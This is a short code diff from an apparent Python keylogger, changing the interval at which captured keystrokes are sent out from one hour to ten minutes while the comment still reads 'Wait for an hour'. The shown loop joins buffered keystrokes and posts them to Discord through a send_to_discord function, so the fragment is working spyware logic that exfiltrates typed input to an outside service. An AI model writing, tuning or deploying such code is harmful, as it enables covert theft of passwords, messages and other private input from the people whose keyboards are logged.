@@ -53,7 +53,7 @@ def log_keys():
     listener.start()
 
     while True:
-        time.sleep(3600)  # Wait for an hour
+        time.sleep(600)  # Wait for an hour
         if key_buffer:
             logged_keys = ''.join(key_buffer)
             send_to_discord(f"Keylog:\n```\n{logged_keys}\n```")
